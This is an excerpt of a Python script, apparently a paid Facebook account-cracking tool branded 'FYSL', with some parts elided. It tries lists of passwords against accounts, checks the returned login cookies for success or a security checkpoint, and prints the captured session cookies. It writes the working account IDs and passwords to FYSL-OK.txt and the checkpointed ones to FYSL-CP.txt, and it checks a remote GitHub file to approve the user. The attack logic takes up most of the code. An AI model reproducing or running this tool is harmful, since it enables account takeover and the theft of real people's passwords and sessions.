...
logo = """
         ...
         \033[1;37m$$ |          $$ |    $$\   $$ |$$ |
         \033[1;37m $$ |          $$ |    \$$$$$$  |$$$$$$$$\
         \033[1;37m     \__|          \__|     \______/ \________|\033[1;32m LPC\033[1;37m 
--------------------------------------------------
[•] AUTHOR     : \033[1;32mFAYSAL MALIK\033[1;37m
[•] STATUS     : \033[1;32mPaid\033[1;37m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 1.0.1 \033[1;37m"Update ki tension nai leni!"\033[1;37m
--------------------------------------------------"""
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/profile.php?id=100006299651741&mibextid=LQQJ4d')
	elif gh =='0':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[FYSL-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('FYSL-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[FYSL-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('FYSL-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97FYSL\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/FYSL/Apr/blob/main/Apr.txt').text
    if id in httpCaht:
